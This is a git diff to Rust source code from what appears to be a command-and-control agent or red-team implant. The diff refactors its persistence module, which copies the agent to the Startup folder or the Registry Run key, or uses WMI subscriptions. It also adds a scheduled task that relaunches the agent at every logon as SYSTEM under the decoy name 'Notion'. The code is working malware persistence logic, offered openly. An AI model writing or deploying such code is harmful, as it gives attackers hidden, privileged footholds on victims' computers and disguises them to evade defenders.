@@ -7,9 +7,9 @@ use crate::cmd::{shell, save};
 #[cfg(windows)] use winreg::{RegKey};
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
+#[cfg(windows)] use std::process::Command;
+#[cfg(windows)] use crate::cmd::getprivs::is_elevated;
 use crate::config::ConfigOptions;
-use std::process::Command;
-use crate::cmd::getprivs::is_elevated;
 
 
 /// Uses the specified method to establish persistence. 
@@ -19,6 +19,7 @@ use crate::cmd::getprivs::is_elevated;
 /// * `startup`: Copies the agent to the Startup Programs folder.
 /// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
 /// * `wmic`: Establishes persistences via WMI subscriptions.
+/// * `schtasks`: Creates a Schedule Task
 /// 
 /// ### Linux Options
 /// 
@@ -138,15 +139,15 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                                 let encoded_config = config_options.to_base64();
                                 let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -c {cfg_path}'" /sc onlogon /ru System""#);
                                 let output = Command::new("schtasks.exe")
-                                    .arg(format!("/create"))
-                                    .arg(format!("/tn"))
-                                    .arg(format!("Notion"))
-                                    .arg(format!("/tr"))
+                                    .arg("/create")
+                                    .arg("/tn")
+                                    .arg("Notion")
+                                    .arg("/tr")
                                     .arg(format!(r#"{persist_path} -c {cfg_path}"#))
-                                    .arg(format!("/sc"))
-                                    .arg(format!("onlogon"))
-                                    .arg(format!("/ru"))
-                                    .arg(format!("System"))
+                                    .arg("/sc")
+                                    .arg("onlogon")
+                                    .arg("/ru")
+                                    .arg("System")
                                     .output()
                                     .expect("failed to execute process");
                             
